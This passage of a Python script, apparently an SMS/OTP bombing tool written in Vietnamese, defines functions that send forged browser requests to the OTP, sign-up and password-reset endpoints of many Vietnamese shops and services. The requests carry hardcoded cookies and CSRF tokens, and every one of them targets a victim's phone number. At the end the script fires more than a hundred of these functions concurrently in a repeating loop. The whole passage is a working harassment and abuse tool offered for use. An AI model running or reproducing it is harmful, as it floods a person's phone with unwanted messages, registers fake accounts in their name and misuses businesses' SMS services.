        print("FRONTROW | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("FRONTROW | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def bibomart():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        'origin': 'https://bibomart.com.vn',
        'priority': 'u=1, i',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'phone': sdt,
        'type': 1,
    }

    try:
        response = requests.post('https://prod.bibomart.net/customer_account/v2/otp/send', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("BIBOMART | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("BIBOMART | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def sbiz():
    cookies = {
        'PHPSESSID': 'pr1dv3me3bo8t9pmp3k2efdi0l',
        'lang': 'vi',
        'product_watched': '%7B%226944%22%3A1723353629%7D',
        'product_watched': '%7B%226944%22%3A1723353629%7D',
    }

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        # 'cookie': 'PHPSESSID=pr1dv3me3bo8t9pmp3k2efdi0l; lang=vi; product_watched=%7B%226944%22%3A1723353629%7D; product_watched=%7B%226944%22%3A1723353629%7D',
        'origin': 'https://sbiz.com.vn',
        'priority': 'u=0, i',
        'referer': 'https://sbiz.com.vn/register/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    data = {
        'full_name': 'tran quoc huy',
        'username': sdt,
        'password': '123123aA@',
        'confirm_password': '123123aA@',
    }

    try:
        response = requests.post('https://sbiz.com.vn/register/', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("SBIZ | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("SBIZ | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def hachihachi():
    cookies = {
        'ASP.NET_SessionId': 'dgmsabih3drxg44o44a4xo0b',
        'Language': 'vi-VN',
    }

    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Access-Control-Allow-Origin': '*',
        'Authorization': 'Bearer',
        'Compunknown': '',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json;charset=UTF-8',
        # 'Cookie': 'ASP.NET_SessionId=dgmsabih3drxg44o44a4xo0b; Language=vi-VN',
        'Data-type': 'json',
        'FormURL': '',
        'Language': 'vi-VN',
        'Origin': 'https://hachihachi.com.vn',
        'Referer': 'https://hachihachi.com.vn/dang-ky?type=34',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'Skey': 'ccfbc3ad0cda421dbd4b71506f16eba5',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'UserName': '',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'Email': '',
        'UserName': sdt,
        'Password': 1723356340457,
        'PhoneNumber': sdt,
        'FullName': 'quoc tien huy',
    }

    try:
        response = requests.post('https://hachihachi.com.vn/api/profile/RegisterUser', cookies=cookies, headers=headers, json=json_data, verify=False)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("HACHIHACHI | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("HACHIHACHI | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def hachihachiresend():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'access-control-allow-origin': '*',
        'authorization': 'Bearer',
        'compunknown': '',
        'content-type': 'application/json;charset=UTF-8',
        'data-type': 'json',
        'formurl': '',
        'language': 'vi-VN',
        'origin': 'https://hachihachi.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://hachihachi.com.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'skey': 'ccfbc3ad0cda421dbd4b71506f16eba5',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'username': '',
    }

    json_data = {
        'PhoneNumber': sdt,
    }

    try:
        response = requests.post('https://identity.hachihachi.com.vn/identity/getactivecode', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("HACHIHACHIRESEND | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("HACHIHACHIRESEND | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def thieuhoa():
    cookies = {
        'XSRF-TOKEN': 'eyJpdiI6IlJPRFFpbi9ZMUVBZWlqbStaS2FJcHc9PSIsInZhbHVlIjoiNWtMRHE3dUxvK2NzcDEwTWw5anhXVGNxeU9NRE5OUGRRV2dCNGJrMUEyNnJmZGYzQW85cy9LUHZqb2hCMUR4cDl5cE1SWEozWWJVYUZIbzNSV3pHeUN5b3RuV05Yc0ovOWxzbnJCNzJlUDRJeVg0RmlCVk1WOUtub2pVUE9ZaFIiLCJtYWMiOiI2Y2EzNDgzODBlOWVjMGY3ZjU5YTZhZTBjZWY5M2VhYmY2M2E0ZmQxZWJiNjVkMjg3MDVhMDdiMDVkOTM2MWE5In0%3D',
        'laravel_session': 'eyJpdiI6IlQyNjdyalZNcXBnMkFwMUNQcnhPbEE9PSIsInZhbHVlIjoibEtoaDcrdGIweXBqM045S1B0bEtacmFpTTZWRTgycFBjdTRKVURTNlhSbzZ6U1M3K2lhUjFncW53Q0hvUnRVVFlta3BCa2FPbWtjUmx6aWFnMjNRZmVyMGNpU0c3eDZVOXI1dGdIeVp3K0E5a0JLSnZReWhVd3dFODdGNCtra1MiLCJtYWMiOiJiZjcwYzBmNzRhOWVlYzA2MjE5NjEzYTBlMDAyYTlhYmQ2MjMxY2VjN2M5MGI5ZjdkNmFiNmZmZDUyNTVkM2ExIn0%3D',
    }

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        # 'cookie': 'XSRF-TOKEN=eyJpdiI6IlJPRFFpbi9ZMUVBZWlqbStaS2FJcHc9PSIsInZhbHVlIjoiNWtMRHE3dUxvK2NzcDEwTWw5anhXVGNxeU9NRE5OUGRRV2dCNGJrMUEyNnJmZGYzQW85cy9LUHZqb2hCMUR4cDl5cE1SWEozWWJVYUZIbzNSV3pHeUN5b3RuV05Yc0ovOWxzbnJCNzJlUDRJeVg0RmlCVk1WOUtub2pVUE9ZaFIiLCJtYWMiOiI2Y2EzNDgzODBlOWVjMGY3ZjU5YTZhZTBjZWY5M2VhYmY2M2E0ZmQxZWJiNjVkMjg3MDVhMDdiMDVkOTM2MWE5In0%3D; laravel_session=eyJpdiI6IlQyNjdyalZNcXBnMkFwMUNQcnhPbEE9PSIsInZhbHVlIjoibEtoaDcrdGIweXBqM045S1B0bEtacmFpTTZWRTgycFBjdTRKVURTNlhSbzZ6U1M3K2lhUjFncW53Q0hvUnRVVFlta3BCa2FPbWtjUmx6aWFnMjNRZmVyMGNpU0c3eDZVOXI1dGdIeVp3K0E5a0JLSnZReWhVd3dFODdGNCtra1MiLCJtYWMiOiJiZjcwYzBmNzRhOWVlYzA2MjE5NjEzYTBlMDAyYTlhYmQ2MjMxY2VjN2M5MGI5ZjdkNmFiNmZmZDUyNTVkM2ExIn0%3D',
        'origin': 'https://thieuhoa.com.vn',
        'priority': 'u=0, i',
        'referer': 'https://thieuhoa.com.vn/dang-nhap',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    data = {
        '_token': 'esnlORfZpbivxOLPYNNt7siNcSbaMPxQs3yC2lk0',
        'phone': sdt,
    }

    try:
        response = requests.post('https://thieuhoa.com.vn/phone_login', cookies=cookies, headers=headers, data=data, verify=False)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("THIEUHOA | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("THIEUHOA | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def dchic():
    cookies = {
        '.AspNetCore.Antiforgery.de1fu8pHkYw': 'CfDJ8APwjHfRbs5OtNrA7aABpe_oiJdoR9Ui7fp5pti71Rqe9oveC08ZtVdA2wMrZCWiYimIWVP6eSTsWvfSD0M_icLCTpO7yknF-0n-Vci8VFxhZcyn_mSk3Rp1liV6AY8i3NFRczJF2YFzGgzptK_5jbI',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': '.AspNetCore.Antiforgery.de1fu8pHkYw=CfDJ8APwjHfRbs5OtNrA7aABpe_oiJdoR9Ui7fp5pti71Rqe9oveC08ZtVdA2wMrZCWiYimIWVP6eSTsWvfSD0M_icLCTpO7yknF-0n-Vci8VFxhZcyn_mSk3Rp1liV6AY8i3NFRczJF2YFzGgzptK_5jbI',
        'origin': 'https://dchic.vn',
        'priority': 'u=1, i',
        'referer': 'https://dchic.vn/tai-khoan/dang-ky',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phoneNumber': sdt,
        'fullName': 'deo co ten',
        'email': random_email,
        'provinceId': '01',
        'districtId': '0',
        'address': '132 Trường Sa, Phường 15, Bình Thạnh, Thành Phố Hồ Chí Minh',
        'birthdayDay': '16',
        'birthdayMonth': '4',
        'birthdayYear': '1996',
        'gender': '1',
        'password': '123123aA@',
        'retypePassword': '123123aA@',
        '__RequestVerificationToken': 'CfDJ8APwjHfRbs5OtNrA7aABpe90_NsgssWG3CGNdSmA6jAEbAhH8dsJdTGt5R67IQvOfSjPEnjhzA-OO4I3KXPkSJCJzG6U2h-iZYuDf1XjcI2f2Itvn3_-h-tawbpH8ZcCZ-qB0_-U5r8nyJwv5P1rPH8',
    }

    response = requests.post('https://dchic.vn/tai-khoan/dang-ky', cookies=cookies, headers=headers, data=data)

    cookies = {
        '.AspNetCore.Antiforgery.de1fu8pHkYw': 'CfDJ8APwjHfRbs5OtNrA7aABpe_oiJdoR9Ui7fp5pti71Rqe9oveC08ZtVdA2wMrZCWiYimIWVP6eSTsWvfSD0M_icLCTpO7yknF-0n-Vci8VFxhZcyn_mSk3Rp1liV6AY8i3NFRczJF2YFzGgzptK_5jbI',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': '.AspNetCore.Antiforgery.de1fu8pHkYw=CfDJ8APwjHfRbs5OtNrA7aABpe_oiJdoR9Ui7fp5pti71Rqe9oveC08ZtVdA2wMrZCWiYimIWVP6eSTsWvfSD0M_icLCTpO7yknF-0n-Vci8VFxhZcyn_mSk3Rp1liV6AY8i3NFRczJF2YFzGgzptK_5jbI',
        'origin': 'https://dchic.vn',
        'priority': 'u=1, i',
        'referer': 'https://dchic.vn/tai-khoan/password-recovery',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phoneNumber': sdt,
        'redirectUrl': '',
        '__RequestVerificationToken': 'CfDJ8APwjHfRbs5OtNrA7aABpe-Bk4NOq9nAEmj6NUIZVgjoFsLqnhlSp0bbTh51k1o3Jdy5XEPLdzcxZpBiVh6sE58Qs67K6utwUtG9CC1PENYy_ScMStXWMsg953cOSnPslZ2zqTQ2IyI51dCQUEnCMiU',
    }

    try:
        response = requests.post('https://dchic.vn/tai-khoan/password-recovery', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("DCHIC | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("DCHIC | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def yvesrocher():
    cookies = {
        'PHPSESSID': 'difsencrdjt6r3m7vhtus2hgpl',
        'form_key': 'oIpdgJS1N6aJEIWf',
        'last_visited_store': 'vn',
        'mage-cache-sessid': 'true',
        'amcookie_policy_restriction': 'allowed',
        'private_content_version': '5c83345338c6871dc3e3c149338253ad',
        'section_data_ids': '%7B%22messages%22%3A1723359748%2C%22customer%22%3A1723359748%2C%22compare-products%22%3A1723359748%2C%22last-ordered-items%22%3A1723359748%2C%22cart%22%3A1723359748%2C%22directory-data%22%3A1723359748%2C%22captcha%22%3A1723359748%2C%22instant-purchase%22%3A1723359748%2C%22loggedAsCustomer%22%3A1723359748%2C%22persistent%22%3A1723359748%2C%22review%22%3A1723359748%2C%22wishlist%22%3A1723359748%2C%22ammessages%22%3A1723359748%2C%22sociallogin%22%3A1723359748%2C%22hyva_checkout%22%3A1723359748%2C%22recently_viewed_product%22%3A1723359748%2C%22recently_compared_product%22%3A1723359748%2C%22product_data_storage%22%3A1723359748%2C%22paypal-billing-agreement%22%3A1723359748%2C%22magepal-gtm-jsdatalayer%22%3A1723359748%2C%22magepal-eegtm-jsdatalayer%22%3A1723359748%7D',
    }

    headers = {
        'Accept': '*/*',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': 'PHPSESSID=difsencrdjt6r3m7vhtus2hgpl; form_key=oIpdgJS1N6aJEIWf; last_visited_store=vn; mage-cache-sessid=true; amcookie_policy_restriction=allowed; private_content_version=5c83345338c6871dc3e3c149338253ad; section_data_ids=%7B%22messages%22%3A1723359748%2C%22customer%22%3A1723359748%2C%22compare-products%22%3A1723359748%2C%22last-ordered-items%22%3A1723359748%2C%22cart%22%3A1723359748%2C%22directory-data%22%3A1723359748%2C%22captcha%22%3A1723359748%2C%22instant-purchase%22%3A1723359748%2C%22loggedAsCustomer%22%3A1723359748%2C%22persistent%22%3A1723359748%2C%22review%22%3A1723359748%2C%22wishlist%22%3A1723359748%2C%22ammessages%22%3A1723359748%2C%22sociallogin%22%3A1723359748%2C%22hyva_checkout%22%3A1723359748%2C%22recently_viewed_product%22%3A1723359748%2C%22recently_compared_product%22%3A1723359748%2C%22product_data_storage%22%3A1723359748%2C%22paypal-billing-agreement%22%3A1723359748%2C%22magepal-gtm-jsdatalayer%22%3A1723359748%2C%22magepal-eegtm-jsdatalayer%22%3A1723359748%7D',
        'Origin': 'https://yvesrocher.vn',
        'Referer': 'https://yvesrocher.vn/vn/customer/account/create/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'mobile': f'84{sdt}',
        'countryreg': '+84',
        'layout': 'mobile-modal-content',
        'form_key': 'oIpdgJS1N6aJEIWf',
    }

    try:
        response = requests.post(
            'https://yvesrocher.vn/vn/mobilelogin/index/registrationotpsend/',
            cookies=cookies,
            headers=headers,
            data=data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("YVESROCHER | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("YVESROCHER | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def guardian():
    cookies = {
        'SRV': '92f1c88d-78ea-46cc-a177-e20fe4d82a02',
        'PHPSESSID': 'f8c4g12cif92nlr8c5bul4hhkt',
        'form_key': 'hCDIFnr6otgBpV5N',
        'private_content_version': 'a21077efbd01778e4e806c261907e039',
        'form_key': 'hCDIFnr6otgBpV5N',
        'mage-cache-storage': '{}',
        'mage-cache-storage-section-invalidation': '{}',
        'mage-cache-sessid': 'true',
        'mage-messages': '',
        'recently_viewed_product': '{}',
        'recently_viewed_product_previous': '{}',
        'recently_compared_product': '{}',
        'recently_compared_product_previous': '{}',
        'product_data_storage': '{}',
        'section_data_ids': '{%22messages%22:1723359937}',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        # 'cookie': 'SRV=92f1c88d-78ea-46cc-a177-e20fe4d82a02; PHPSESSID=f8c4g12cif92nlr8c5bul4hhkt; form_key=hCDIFnr6otgBpV5N; private_content_version=a21077efbd01778e4e806c261907e039; form_key=hCDIFnr6otgBpV5N; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; mage-cache-sessid=true; mage-messages=; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; section_data_ids={%22messages%22:1723359937}',
        'origin': 'https://www.guardian.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://www.guardian.com.vn/customer/account/create/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    json_data = {
        'telephone': sdt,
    }

    try:
        response = requests.post(
            'https://www.guardian.com.vn/rest/V1/smsOtp/generateOtpForNewAccount',
            cookies=cookies,
            headers=headers,
            json=json_data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("GUARDIAN | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("GUARDIAN | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def leflair():
    cookies = {
        'frontend_lang': 'vi_VN',
        'session_id': 'a2cdb87e08a0fca923bbd0e3cbabe5dfaf2629fe',
        'tz': 'Asia/Bangkok',
    }

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        # 'cookie': 'frontend_lang=vi_VN; session_id=a2cdb87e08a0fca923bbd0e3cbabe5dfaf2629fe; tz=Asia/Bangkok',
        'origin': 'https://leflair.com',
        'priority': 'u=0, i',
        'referer': 'https://leflair.com/web/signup',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    data = {
        'csrf_token': '3d3013deba85293950b699921c9803dfd1a330f9o1754896253',
        'login': sdt,
        'name': 'John Davis',
        'password': '123123aA@',
        'confirm_password': '123123aA@',
        'redirect': '',
        'token': '',
    }

    try:
        response = requests.post('https://leflair.com/web/signup', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("LEFLAIR | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("LEFLAIR | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

functions = [
    tv360, beautybox, kingfood, batdongsan, futabus, galaxyplay, hoangphuc, gumac, vinamilk,
    speedlotte, medicare, tokyolife, vieon, fptreg, fptreset, fptresend, winmart, tgdidong,
    dienmayxanh, meta, thefaceshop, bestexpress, ghnexpress, myviettel, fptshop, sapo, paynet,
    reebok, gapowork, shine, oreka, fmstyle, acfc, fptlongchauzl, thuocsi, pantio,
    winny, owen, befood, foodhubzl, heyu, pantioresend, vttelecom, vinwonders, vietair, vexere,
    atadi, etrip4u, tinyworld, chudu24, sojo, hasaki, kiehls, emart, hanoia, ahamove, fahasa, book365reg,
    vascara, sablanca, sandro, routine, coolmate, mioto, coolmatereset, pharmartsms, medigosms, avakids,
    giathuoctot, medigozl, ddmevabereg, pnjsms, pharmartzl, jiohealth, ddmevabe, xanhsmreg, pcspostreg,
    nhathuocankhang, mocha, sigo, vietravel, pnjzl, mamanbebe, tatmart, dominos, ghtkreg,
    pico, hacom, liena, gofood, pasgo, coolmateresend, vietloan, viettelpost, xanhsm, acheckin, ghtk,
    pcspost, book365, richvn, brgshopping, nativex, vuihoc, mainguyen, phongtro123, chothuephongtro, bds123,
    vnsc, opes, hoasenhome, vulcano, vulcanoreset, frontrow, bibomart, sbiz, hachihachi,
    hachihachiresend, thieuhoa, dchic, yvesrocher, guardian, leflair
]

def execute_with_delay(func):
    func()
    time.sleep(0)

def main(count):
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        for _ in range(count):
            futures = [executor.submit(execute_with_delay, func) for func in functions]
            concurrent.futures.wait(futures)

# Example usage
if __name__ == "__main__":  # Change this to the desired count
    main(count)
